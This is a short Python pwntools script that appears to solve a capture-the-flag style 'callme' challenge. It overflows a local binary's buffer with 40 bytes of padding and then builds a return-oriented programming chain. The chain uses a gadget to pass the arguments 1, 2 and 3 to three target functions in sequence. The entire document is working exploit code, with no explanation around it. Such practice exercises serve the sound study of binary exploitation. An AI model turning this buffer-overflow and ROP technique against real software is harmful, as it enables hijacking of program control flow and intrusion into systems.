from pwn import *

p = process('./callme')

gadget = 0x401ab0
callme_one = 0x401850
callme_two = 0x401870
callme_three = 0x401810

payload = 'a' * 40
payload += p64(gadget)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_one)

payload += p64(gadget)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_two)

payload += p64(gadget)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_three)

p.sendline(payload)
print p.recvall()
